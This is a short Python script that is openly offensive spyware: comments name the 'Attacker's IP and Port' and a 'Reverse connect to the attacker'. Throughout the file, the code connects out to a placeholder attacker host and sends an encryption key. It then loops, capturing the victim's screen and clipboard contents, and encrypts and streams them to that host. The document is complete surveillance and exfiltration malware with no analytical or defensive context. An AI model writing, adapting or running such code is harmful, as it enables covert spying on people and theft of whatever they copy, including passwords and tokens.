import socket
import struct
import pickle
import cv2
import mss
import numpy as np
from cryptography.fernet import Fernet
import pyperclip

# Attacker's IP and Port
HOST = PLACEHOLDER_IP
PORT = PLACEHOLDER_PORT

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))  # Reverse connect to the attacker

print(f"[+] Connected")

key = Fernet.generate_key()
cipher = Fernet(key)

client.send(key)  # Send key to attacker for decryption

sct = mss.mss()

while True:
    screenshot = sct.grab(sct.monitors[1])  # Capture screen
    frame = np.array(screenshot)  # Convert to NumPy array
    frame = cv2.resize(frame, (800, 450))  # Resize

    clipboard = pyperclip.paste()  # Get clipboard content

    # Serialize both frame and clipboard together
    data = {
        "frame": frame,
        "clipboard": clipboard
    }

    serialized_data = pickle.dumps(data)  # Ensure serialization to bytes
    encrypted_data = cipher.encrypt(serialized_data)  # Encrypt serialized data

    message = struct.pack("Q", len(encrypted_data)) + encrypted_data

    try:
        client.sendall(message)
    except:
        break

client.close()
